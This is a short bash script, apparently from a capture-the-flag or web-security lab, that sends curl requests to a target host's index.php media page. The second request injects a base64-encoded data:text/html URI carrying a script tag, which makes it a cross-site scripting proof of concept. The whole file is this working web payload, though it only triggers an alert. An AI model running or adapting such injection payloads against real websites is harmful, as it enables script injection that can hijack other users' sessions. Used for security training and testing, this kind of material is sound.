#!/bin/bash
curl "http://$IP/index.php?page=media&src=nsa" -v
curl "http://$IP/index.php?page=media&src=data:text/html;base64,"`echo "<script>alert('f');</script>" | base64` -v
